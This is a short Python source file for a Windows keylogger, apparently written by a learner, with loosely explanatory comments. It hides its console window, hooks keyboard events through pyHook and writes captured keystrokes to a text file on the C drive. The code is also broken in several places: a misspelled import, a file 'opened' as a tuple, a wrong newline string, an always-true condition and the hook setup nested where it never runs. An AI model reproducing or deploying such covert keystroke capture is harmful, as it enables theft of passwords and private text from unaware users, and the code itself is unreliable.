#Go to the library to obtain the book for the python application

#API (Aplication) allows the two different code languages to communicate to each other
import win32api
import win32console
import win32gui
#Class library for the keyboard
import pyhoncom, pyHook

#Show the Console window the screen
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnkeyboardEvent(event):

	if event.Ascii == 5:
		_exit(1)


	if event.Ascii !=0 or 8:
		#open the path file as a text file and input the keybard text.
		f = open('c:\output.txt', 'r+')

		buffer = f.read()

		#Close the file on the operating sytem when the user stops typing
		f.close()

	#Re-Open the text file when the user start typing again on the keyboard
		f =('c:\output.txt', 'w')

		keylogs = chr(event.Ascii)

		if event.Ascii == 13:

			#Starts a new line in the text file
			keylogs = '/n'

			buffer += keylogs

			f.write(buffer)
			f.close()

	#Create a hook for the manager object

	hm = pyHook.HookManager()
	hm.KeyDown = OnkeyboardEvent

	#Set the hook
	hm.HookKeyboard()

	#Wait forever
	pythoncom.PumpMessages()